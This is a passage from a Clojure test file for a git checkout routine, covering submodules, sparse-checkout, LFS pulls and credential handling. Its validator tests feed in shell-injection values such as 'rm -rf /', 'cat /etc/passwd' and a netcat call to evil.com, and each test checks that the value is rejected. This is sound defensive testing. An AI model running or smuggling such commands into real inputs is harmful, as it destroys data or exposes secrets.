      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git"} "/ws" nil)
        (is (not-any? #(re-find #"git submodule" %) @cmds))))))

(deftest submodules-real-fixture-test
  (when (git-available?)
    (let [child-dir (init-child-repo! (str fixture-root "/sub-child"))
          parent-dir (init-base-repo! (str fixture-root "/sub-parent"))
          ws-dir (.getAbsolutePath (io/file (str fixture-root "/sub-ws")))]
      (add-submodule! parent-dir child-dir "vendored")
      (rm-rf! ws-dir)
      (mkdir-p! ws-dir)
      (testing ":submodules? true → vendored/child.txt is materialized"
        ;; Need protocol.file.allow=always for file:// submodules to work.
        ;; Tests run the engine code-path verbatim, but git's CVE mitigation
        ;; requires this for local-file clones. We set it as an env knob
        ;; instead of changing the engine: real users won't be using file://
        ;; remotes, and this lets us validate the end-to-end shape.
        (let [orig process/execute-command]
          (with-redefs [process/execute-command
                        (fn [m]
                          (orig (update m :env merge
                                        {"GIT_ALLOW_PROTOCOL" "file:http:https:ssh"
                                         "GIT_CONFIG_COUNT"   "1"
                                         "GIT_CONFIG_KEY_0"   "protocol.file.allow"
                                         "GIT_CONFIG_VALUE_0" "always"})))]
            (let [r (git/checkout-source!
                     {:url (str "file://" parent-dir)
                      :branch "main"
                      :submodules? true}
                     ws-dir nil)]
              (is (true? (:success? r)) (str "checkout result: " (:error r)))
              (is (.exists (io/file ws-dir "vendored/child.txt"))
                  "submodule contents must be initialized & checked out")))))
      (rm-rf! ws-dir)
      (mkdir-p! ws-dir)
      (testing ":submodules? false (default) → vendored/ exists but is empty"
        (let [r (git/checkout-source!
                 {:url (str "file://" parent-dir) :branch "main"}
                 ws-dir nil)]
          (is (true? (:success? r)) (str "checkout result: " (:error r)))
          ;; The submodule directory exists (it's tracked by the parent) but
          ;; its contents are not populated without `submodule update`.
          (let [child-file (io/file ws-dir "vendored/child.txt")]
            (is (not (.exists child-file))
                "without :submodules?, submodule contents must NOT be pulled in")))))))

(deftest lfs-missing-throws-test
  (testing ":lfs? true with git-lfs missing throws :git-lfs-missing"
    (with-redefs [process/execute-command
                  (fn [m]
                    (cond
                      ;; lfs version probe fails → "not installed"
                      (re-find #"git lfs version" (:command m))
                      {:exit-code 1 :stderr "git: 'lfs' is not a git command"}

                      (re-find #"rev-parse HEAD" (:command m))
                      {:exit-code 0 :stdout "x\n"}

                      :else {:exit-code 0 :stdout "ok\n"}))]
      (let [ex (try (git/checkout-source! {:url "https://h/r.git" :lfs? true}
                                          "/ws" nil)
                    nil
                    (catch clojure.lang.ExceptionInfo e e))]
        (is (some? ex))
        (is (= :git-lfs-missing (:error (ex-data ex))))
        (is (re-find #"git-lfs is not installed" (.getMessage ^Exception ex)))))))

(deftest lfs-available-runs-install+pull-test
  (testing ":lfs? true with git-lfs present runs `lfs install --local` + `lfs pull`"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (let [r (git/checkout-source! {:url "https://h/r.git" :lfs? true}
                                      "/ws" nil)]
          (is (true? (:success? r)))
          ;; probe was invoked
          (is (some #(re-find #"git lfs version" %) @cmds))
          ;; LFS init scoped to the local repo (no global side effects)
          (is (some #(re-find #"git lfs install --local" %) @cmds))
          ;; pulls the LFS blobs after checkout
          (is (some #(re-find #"git lfs pull" %) @cmds))))))
  (testing ":lfs? false (default) does NOT probe or invoke any lfs subcommand"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git"} "/ws" nil)
        (is (not-any? #(re-find #"git lfs" %) @cmds))))))

(deftest all-three-opt-ins-compose-test
  (testing ":submodules? :sparse-checkout :lfs? all true → all three apply in order"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git"
                               :branch "main"
                               :sparse-checkout ["src/"]
                               :submodules? true
                               :lfs? true}
                              "/ws" nil)
        (let [steps @cmds
              idx (fn [pat]
                    (or (some (fn [[i c]] (when (re-find pat c) i))
                              (map-indexed vector steps))
                        Integer/MAX_VALUE))]
          ;; Order: clone → sparse init/set → checkout branch → submodules → lfs
          (is (< (idx #"git clone")
                 (idx #"git sparse-checkout init")
                 (idx #"git sparse-checkout set")
                 (idx #"git checkout main")
                 (idx #"git submodule update --init --recursive")
                 (idx #"git lfs install --local")
                 (idx #"git lfs pull"))
              (str "expected ordering not satisfied; commands: " (pr-str steps)))
          ;; CHG-FEAT-007 PR1 round 2 (Codex P2): when both :submodules?
          ;; and :lfs? are set, the foreach runs AFTER the superproject
          ;; lfs pull to resolve LFS pointers inside submodules. Round 3
          ;; (Codex P2) wraps the inner command (so a token insteadOf
          ;; can be injected for HTTPS submodule auth), so the actual
          ;; command is `git submodule foreach --recursive "git lfs pull"`.
          (is (some #(re-find #"git submodule foreach --recursive.*git lfs pull" %)
                    steps)
              "expected `git submodule foreach --recursive ... git lfs pull` after lfs pull")
          (is (< (idx #"^git lfs pull( --include=|$)")
                 (idx #"git submodule foreach --recursive.*git lfs pull"))
              "foreach must run AFTER the superproject lfs pull"))))))

;; ---------------------------------------------------------------------------
;; CHG-FEAT-007 PR1 round 2 (Codex P2 batch)
;; ---------------------------------------------------------------------------

(deftest sparse-checkout-rejects-ambiguous-nested-paths-test
  ;; Rounds 3+4 (Codex P2): cone-mode sparse-checkout silently broadens
  ;; any nested non-directory pattern to its parent dir. Round 3's
  ;; dot-extension heuristic missed extensionless files like
  ;; `src/Makefile`. Round 4: require trailing `/` for nested patterns
  ;; — unambiguous directory selection, regardless of extension.
  (testing "nested file path with extension throws :invalid-sparse-pattern"
    (is (thrown-with-msg?
         clojure.lang.ExceptionInfo
         #"Invalid sparse-checkout pattern"
         (git/checkout-source! {:url "https://h/r.git"
                                :sparse-checkout ["src/only.clj"]}
                               "/ws" nil))))
  (testing "deeply nested file path is also rejected"
    (is (thrown-with-msg?
         clojure.lang.ExceptionInfo
         #"Invalid sparse-checkout pattern"
         (git/checkout-source! {:url "https://h/r.git"
                                :sparse-checkout ["tools/scripts/build.sh"]}
                               "/ws" nil))))
  (testing "extensionless nested filename (e.g. Makefile, LICENSE) rejected"
    ;; The round-4 fix: require trailing `/` for nested patterns. This
    ;; catches `src/Makefile`, `docs/LICENSE`, `tools/Dockerfile` —
    ;; cases the round-3 dot-extension heuristic missed.
    (is (thrown-with-msg?
         clojure.lang.ExceptionInfo
         #"Invalid sparse-checkout pattern"
         (git/checkout-source! {:url "https://h/r.git"
                                :sparse-checkout ["src/Makefile"]}
                               "/ws" nil)))
    (is (thrown-with-msg?
         clojure.lang.ExceptionInfo
         #"Invalid sparse-checkout pattern"
         (git/checkout-source! {:url "https://h/r.git"
                                :sparse-checkout ["docs/LICENSE"]}
                               "/ws" nil)))
    (is (thrown-with-msg?
         clojure.lang.ExceptionInfo
         #"Invalid sparse-checkout pattern"
         (git/checkout-source! {:url "https://h/r.git"
                                :sparse-checkout ["tools/Dockerfile"]}
                               "/ws" nil))))
  (testing "nested directory WITHOUT trailing slash also rejected (ambiguous)"
    (is (thrown-with-msg?
         clojure.lang.ExceptionInfo
         #"Invalid sparse-checkout pattern"
         (git/checkout-source! {:url "https://h/r.git"
                                :sparse-checkout ["src/utils"]}
                               "/ws" nil))))
  (testing "directory prefix WITH trailing slash is allowed"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (let [r (git/checkout-source! {:url "https://h/r.git"
                                       :branch "main"
                                       :sparse-checkout ["src/utils/"]}
                                      "/ws" nil)]
          (is (true? (:success? r)))
          (is (some #(re-find #"sparse-checkout set -- \"src/utils/\"" %) @cmds))))))
  (testing "round 13 (Codex P2): top-level patterns WITHOUT `/` are accepted (git validates at runtime)"
    ;; Codex round 13 inverts round 9 — `src` (no slash) is a valid
    ;; cone top-level dir pattern that git normalizes to `/src/`.
    ;; The validator no longer false-rejects these; git's own check
    ;; surfaces a clear error if the operator wrote a top-level file
    ;; name by mistake.
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (let [r (git/checkout-source! {:url "https://h/r.git"
                                       :branch "main"
                                       :sparse-checkout ["src" "docs"]}
                                      "/ws" nil)]
          (is (true? (:success? r))
              "top-level dir patterns without trailing `/` accepted at validator"))))))

(deftest sparse-checkout-keeps-branch-on-clone-test
  ;; Round-2 fix: a shallow sparse clone with :branch must include `-b
  ;; <branch>` so `--depth` doesn't single-branch the wrong ref. Without
  ;; this fix, the subsequent `git checkout <branch>` fails because that
  ;; branch is not in the partial fetch.
  (testing "sparse + branch + depth → clone keeps -b <branch>"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git"
                               :branch "feature/foo"
                               :depth 1
                               :sparse-checkout ["src/"]}
                              "/ws" nil)
        (let [clone-cmd (first (filter #(str/starts-with? % "git clone") @cmds))]
          (is (re-find #"--filter=blob:none" clone-cmd))
          (is (re-find #"--no-checkout" clone-cmd))
          (is (re-find #" -b feature/foo" clone-cmd)
              (str "round-2 fix: -b kept in sparse mode; got: " clone-cmd))
          (is (re-find #"--depth 1" clone-cmd)))))))

(deftest submodule-update-injects-token-insteadof-test
  ;; Round-2 fix: `git submodule update` must rewrite `.gitmodules` URLs
  ;; with the parent's HTTPS token via `-c url.<token-url>.insteadOf=<plain>`
  ;; so same-host private submodules can authenticate.
  (testing ":submodules? true + :credentials {:token X} → insteadOf config on submodule update"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://github.com/org/parent.git"
                               :submodules? true
                               :credentials {:token "ghp_SECRET"}}
                              "/ws" nil)
        (let [sub-cmd (some #(when (re-find #"submodule update" %) %) @cmds)]
          (is (some? sub-cmd) "submodule update was invoked")
          (is (re-find #"-c url\.\"https://x-access-token:ghp_SECRET@github\.com/\"\.insteadOf=\"https://github\.com/\""
                       sub-cmd)
              (str "round-2 fix: insteadOf rewrite missing; got: " sub-cmd))))))
  (testing ":submodules? true with no token → no insteadOf injection"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://github.com/org/parent.git"
                               :submodules? true}
                              "/ws" nil)
        (let [sub-cmd (some #(when (re-find #"submodule update" %) %) @cmds)]
          (is (some? sub-cmd))
          (is (not (re-find #"insteadOf" sub-cmd))
              "no token → no insteadOf rewrite")))))
  (testing ":submodules? true with SSH credentials → no insteadOf injection (SSH env handles auth)"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "git@github.com:org/parent.git"
                               :submodules? true
                               :credentials {:ssh-key "/etc/keys/id_rsa"}}
                              "/ws" nil)
        (let [sub-cmd (some #(when (re-find #"submodule update" %) %) @cmds)]
          (is (some? sub-cmd))
          (is (not (re-find #"insteadOf" sub-cmd))
              "SSH credentials propagate via GIT_SSH_COMMAND, not insteadOf"))))))

(deftest sparse-checkout-materializes-branch-on-commit-failure-test
  ;; Round 8 (Codex P2): sparse + commit-override that fails +
  ;; lenient mode (not require-commit-checkout?) used to leave the
  ;; working tree empty because the sparse clone used --no-checkout
  ;; and the failed commit checkout never materialized anything.
  ;; Fix: fall back to `git checkout <branch|HEAD>` so the workspace
  ;; has actual files.
  (testing "sparse + bad commit + lenient → fallback branch checkout runs"
    (let [cmds (atom [])
          checkout-calls (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        ;; Commit-override checkout fails
                        (re-find #"^git checkout deadbeef" (:command m))
                        (do (swap! checkout-calls conj :commit) {:exit-code 1 :stderr "bad ref"})
                        ;; Fallback branch checkout succeeds
                        (re-find #"^git checkout main" (:command m))
                        (do (swap! checkout-calls conj :branch) {:exit-code 0 :stdout "ok\n"})
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git"
                               :branch "main"
                               :sparse-checkout ["src/"]}
                              "/ws" "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef")
        (is (some #(= :commit %) @checkout-calls)
            "commit-override checkout attempted")
        (is (some #(= :branch %) @checkout-calls)
            "fallback branch checkout attempted after commit failure")
        ;; Order: commit first, fallback after
        (let [commit-idx (.indexOf @checkout-calls :commit)
              branch-idx (.indexOf @checkout-calls :branch)]
          (is (< commit-idx branch-idx)
              "fallback runs AFTER commit failure")))))
  (testing "round 10 (Codex P2): sparse + bad commit + fallback ALSO fails → checkout-source! returns failure"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        ;; Both commit-override AND branch fallback fail
                        (re-find #"^git checkout " (:command m))
                        {:exit-code 1 :stderr "ref not found"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (let [r (git/checkout-source!
                 {:url "https://h/r.git"
                  :branch "main"
                  :sparse-checkout ["src/"]}
                 "/ws" "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef")]
          (is (false? (:success? r))
              "fallback failure must surface as checkout-source! failure")
          (is (re-find #"sparse-checkout fallback" (:error r))
              "error message identifies sparse-fallback as the failure mode")
          (is (nil? (:git-info r))
              ":git-info nil so callers can't accidentally proceed with phantom metadata")))))
  (testing "non-sparse + bad commit + lenient → no fallback (clone already populated tree)"
    (let [cmds (atom [])
          checkout-calls (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        (re-find #"^git checkout deadbeef" (:command m))
                        (do (swap! checkout-calls conj :commit) {:exit-code 1 :stderr "bad ref"})
                        (re-find #"^git checkout main" (:command m))
                        (do (swap! checkout-calls conj :branch-fallback) {:exit-code 0 :stdout "ok\n"})
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git" :branch "main"}
                              "/ws" "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef")
        (is (some #(= :commit %) @checkout-calls))
        (is (not-any? #(= :branch-fallback %) @checkout-calls)
            "non-sparse skips the fallback — clone already populated the working tree")))))

(deftest sparse-checkout-rejects-leading-dash-test
  ;; Round 7 (Codex P2): a pattern starting with `-` would be parsed
  ;; by `git sparse-checkout set` as an option flag (`--no-cone`,
  ;; `--stdin`, etc.). The validator now rejects leading-`-`; the
  ;; command also gains `--` separator as defense in depth.
  (testing "leading-dash pattern is rejected"
    (is (thrown-with-msg?
         clojure.lang.ExceptionInfo
         #"Invalid sparse-checkout pattern"
         (git/checkout-source! {:url "https://h/r.git"
                                :sparse-checkout ["-foo/"]}
                               "/ws" nil))))
  (testing "git option-like pattern is rejected"
    (is (thrown-with-msg?
         clojure.lang.ExceptionInfo
         #"Invalid sparse-checkout pattern"
         (git/checkout-source! {:url "https://h/r.git"
                                :sparse-checkout ["--no-cone"]}
                               "/ws" nil))))
  (testing "sparse-checkout set command emits -- separator"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git"
                               :branch "main"
                               :sparse-checkout ["src/"]}
                              "/ws" nil)
        (let [set-cmd (some #(when (re-find #"sparse-checkout set" %) %) @cmds)]
          (is (some? set-cmd))
          (is (re-find #"sparse-checkout set -- " set-cmd)
              (str "round-7 fix: `--` separator missing; got: " set-cmd)))))))

(deftest sparse-checkout-rejects-shell-metacharacters-test
  ;; Round 6 (Codex P2): sparse patterns are user-controlled and end up
  ;; inside a `sh -c "<command>"` invocation. `pr-str` double-quotes
  ;; but does NOT escape `$(...)` command substitution. The validator
  ;; now enforces an allow-list of `[A-Za-z0-9._/-]` so shell
  ;; metacharacters can't reach the shell.
  (testing "command substitution `$(...)` is rejected"
    (is (thrown-with-msg?
         clojure.lang.ExceptionInfo
         #"Invalid sparse-checkout pattern"
         (git/checkout-source! {:url "https://h/r.git"
                                :sparse-checkout ["src/$(touch /tmp/pwn)/"]}
                               "/ws" nil))))
  (testing "backtick substitution is rejected"
    (is (thrown-with-msg?
         clojure.lang.ExceptionInfo
         #"Invalid sparse-checkout pattern"
         (git/checkout-source! {:url "https://h/r.git"
                                :sparse-checkout ["src/`whoami`/"]}
                               "/ws" nil))))
  (testing "shell separators (`;` `&` `|`) are rejected"
    (doseq [bad ["src/;rm -rf /;" "src/&&cat /etc/passwd" "src/|nc evil.com 80"]]
      (is (thrown-with-msg?
           clojure.lang.ExceptionInfo
           #"Invalid sparse-checkout pattern"
           (git/checkout-source! {:url "https://h/r.git"
                                  :sparse-checkout [bad]}
                                 "/ws" nil))
          (str "bad pattern: " bad))))
  (testing "whitespace and quotes are rejected"
    (doseq [bad ["src/my dir/" "src/\"x\"/" "src/'x'/"]]
      (is (thrown-with-msg?
           clojure.lang.ExceptionInfo
           #"Invalid sparse-checkout pattern"
           (git/checkout-source! {:url "https://h/r.git"
                                  :sparse-checkout [bad]}
                                 "/ws" nil))
          (str "bad pattern: " bad)))))

(deftest sparse-checkout-propagates-credentials-to-checkout-test
  ;; Round 6 (Codex P2): the sparse clone uses `--filter=blob:none`,
  ;; so the explicit `git checkout` step that materializes the
  ;; working tree may need to lazily fetch blobs from the promisor
  ;; remote. That fetch must inherit the same credentials (env / token)
  ;; as the original clone — without `GIT_SSH_COMMAND` it falls back
  ;; to the agent's default key and fails.
  (testing "sparse + :ssh-key → checkout invocation receives GIT_SSH_COMMAND env"
    (let [invocations (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! invocations conj (select-keys m [:command :env]))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "git@github.com:org/repo.git"
                               :branch "main"
                               :sparse-checkout ["src/"]
                               :credentials {:ssh-key "/etc/keys/id_rsa"}}
                              "/ws" nil)
        (let [checkout-inv (some #(when (re-find #"^git checkout main" (:command %)) %) @invocations)]
          (is (some? checkout-inv) "sparse-mode checkout invoked")
          (is (str/includes? (str (get-in checkout-inv [:env "GIT_SSH_COMMAND"]))
                             "-i /etc/keys/id_rsa")
              (str "round-6 fix: SSH env missing from sparse checkout; got: "
                   (pr-str (:env checkout-inv)))))))))

(deftest submodule-update-scopes-pathspec-to-sparse-test
  ;; Round 5 (Codex P2): with :sparse-checkout set, submodule update
  ;; passes the sparse patterns as positional pathspec args so only
  ;; submodules under the sparse selection get initialized. Otherwise
  ;; sparse + submodules clones every submodule in .gitmodules.
  (testing ":submodules? + :sparse-checkout → pathspec args restrict init"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git"
                               :branch "main"
                               :submodules? true
                               :sparse-checkout ["src/" "lib/"]}
                              "/ws" nil)
        (let [sub-cmd (some #(when (re-find #"submodule update" %) %) @cmds)]
          (is (some? sub-cmd))
          (is (re-find #"submodule update --init --recursive -- \"src/\" \"lib/\""
                       sub-cmd)
              (str "round-5 fix: pathspec missing; got: " sub-cmd))))))
  (testing ":submodules? without :sparse-checkout → no pathspec (init all)"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git" :submodules? true}
                              "/ws" nil)
        (let [sub-cmd (some #(when (re-find #"submodule update" %) %) @cmds)]
          (is (some? sub-cmd))
          (is (not (re-find #" -- " sub-cmd))
              "no sparse → no pathspec separator"))))))

(deftest lfs-pull-bounded-by-sparse-include-test
  ;; Round 5 (Codex P2): with :sparse-checkout set, `git lfs pull` is
  ;; invoked with `--include=<patterns>` so LFS bandwidth is bounded
  ;; by the sparse selection. Otherwise a sparse repo with large
  ;; out-of-scope LFS files still pulls all of them.
  (testing ":lfs? + :sparse-checkout → --include passed to lfs pull (sparse dirs only)"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git"
                               :branch "main"
                               :lfs? true
                               :sparse-checkout ["src/" "assets/"]}
                              "/ws" nil)
        (let [lfs-cmd (some #(when (re-find #"^git lfs pull" %) %) @cmds)]
          (is (some? lfs-cmd))
          ;; Round 12 (Codex P2): NOT prepending `*` — git-lfs
          ;; treats `*` as "any path" rather than "top-level only"
          ;; and re-broadens to every subdir. Honest trade-off:
          ;; top-level LFS pointers stay unresolved in sparse mode.
          (is (re-find #"--include=\"src/,assets/\"" lfs-cmd)
              (str "round-12 fix: sparse dirs only, no `*`; got: " lfs-cmd))
          (is (not (re-find #"\*" lfs-cmd))
              "no `*` glob — git-lfs would broaden to all subdirs")))))
  (testing ":lfs? without :sparse-checkout → no --include (pull everything)"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git" :lfs? true} "/ws" nil)
        (let [lfs-cmd (some #(when (re-find #"^git lfs pull" %) %) @cmds)]
          (is (some? lfs-cmd))
          (is (not (re-find #"--include" lfs-cmd))
              "no sparse → no --include flag"))))))

(deftest lfs-pull-recurses-submodules-when-both-opt-ins-set-test
  ;; Round-2 fix: `git lfs pull` on the superproject does NOT recurse
  ;; into submodules; LFS pointers inside submodules stay unresolved
  ;; unless we explicitly `git submodule foreach --recursive git lfs pull`.
  (testing ":lfs? true + :submodules? true → foreach --recursive git lfs pull AFTER superproject lfs pull"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git"
                               :submodules? true
                               :lfs? true}
                              "/ws" nil)
        (let [steps @cmds
              lfs-pull-idx (some (fn [[i c]]
                                   (when (and (re-find #"git lfs pull" c)
                                              (not (re-find #"foreach" c))) i))
                                 (map-indexed vector steps))
              foreach-idx (some (fn [[i c]]
                                  (when (re-find #"git submodule foreach --recursive.*git lfs pull" c)
                                    i))
                                (map-indexed vector steps))]
          (is (some? lfs-pull-idx) "superproject lfs pull invoked")
          (is (some? foreach-idx) "foreach lfs pull invoked")
          (is (< lfs-pull-idx foreach-idx)
              "foreach must run AFTER superproject lfs pull")))))
  (testing ":lfs? true + :submodules? false → NO foreach (lfs pull only on superproject)"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git" :lfs? true} "/ws" nil)
        (is (some #(re-find #"git lfs pull" %) @cmds))
        (is (not-any? #(re-find #"submodule foreach" %) @cmds)
            "no submodules → no foreach")))))

(deftest backward-compat-no-new-keys-test
  (testing "pre-FEAT-007 :source map (no new keys) yields exact legacy command sequence"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git" :branch "main"} "/ws" nil)
        ;; None of the new sub-commands appear at all
        (is (not-any? #(re-find #"sparse-checkout" %) @cmds))
        (is (not-any? #(re-find #"git submodule" %) @cmds))
        (is (not-any? #(re-find #"git lfs" %) @cmds))
        ;; The clone command is byte-identical to the pre-PR shape
        (let [clone-cmd (first (filter #(str/starts-with? % "git clone") @cmds))]
          (is (re-find #"^git clone -b main -- " clone-cmd)
              (str "legacy clone shape changed: " clone-cmd)))))))
